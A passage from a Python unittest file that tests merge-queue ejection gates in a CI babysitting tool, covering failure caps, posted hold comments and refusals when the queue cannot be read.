                        "readError": None,
                        "commentError": None,
                    },
                )

    def test_a_head_at_or_over_the_cap_carries_the_gates_hold_and_comment(
        self,
    ) -> None:
        for count in (2, 3):
            with self.subTest(count=count):
                queue = self.cli({"readError": None, "failedEjections": count})["queue"]
                self.assertEqual(
                    (queue["failedEjections"], queue["limit"], queue["refusal"]),
                    (count, 2, EJECTED.replace("ejected:2", f"ejected:{count}")),
                )
                comment = str(queue["comment"]).split("\n")
                self.assertEqual(comment[0], "<!-- babysit-merge-queue-ejections -->")
                self.assertIn(f"head `{HEAD}` {count} times", comment[1])
                self.assertIn(f"- {RUN}", comment)

    def test_an_unreadable_count_refuses_with_no_comment_and_says_why(self) -> None:
        for queue, why in (
            (
                {"readError": "could not read the merge queue: boom"},
                "could not read the merge queue: boom",
            ),
            (
                {"readError": None, "failedEjections": None},
                "the merge queue's timeline items could not be counted",
            ),
            (RuntimeError("boom"), "RuntimeError: boom"),
        ):
            with self.subTest(queue=repr(queue)):
                self.assertEqual(
                    self.cli(queue)["queue"],
                    {
                        "failedEjections": None,
                        "limit": 2,
                        "refusal": UNREADABLE_QUEUE,
                        "comment": None,
                        "readError": why,
                        "commentError": None,
                    },
                )

    def test_a_failed_runs_read_still_refuses_and_names_its_error(self) -> None:
        queue = self.cli(
            {"readError": None, "failedEjections": 2}, runs=RuntimeError("boom")
        )["queue"]
        self.assertEqual(
            (queue["refusal"], queue["comment"], queue["commentError"]),
            (EJECTED, None, "error: boom"),
        )

    def test_the_comment_is_the_one_the_gate_posts(self) -> None:
        queue = self.cli({"readError": None, "failedEjections": 2})["queue"]
        with mock.patch.object(
            babysit_merge, "_failed_merge_group_runs", return_value=[RUN]
        ):
            gate = babysit_merge.queue_ejection_hold(REPO, "main", 41, HEAD, 2, 2)
        self.assertEqual((queue["refusal"], queue["comment"]), gate[:2])

    def test_a_refused_verdict_or_a_risk_hold_reads_no_queue(self) -> None:
        for kwargs in (
            {"evidence": ve.Evidence(ve.FAIL, HEAD, (), 0)},
            {"risk": "unsafe-path: docs/link"},
        ):
            with self.subTest(kwargs=repr(kwargs)):
                report = self.cli({"readError": None, "failedEjections": 5}, **kwargs)
                self.assertNotIn("queue", report)
                self.read.assert_not_called()

    def test_the_flag_needs_the_risk_read_that_checks_the_head(self) -> None:
        argv = ["evidence", "--lane-queue", "--repo", REPO, "--base-sha", BASE]
        with (
            contextlib.redirect_stderr(io.StringIO()),
            self.assertRaises(SystemExit),
        ):
            ve.main([*argv, "41", HEAD])


if __name__ == "__main__":
    unittest.main()
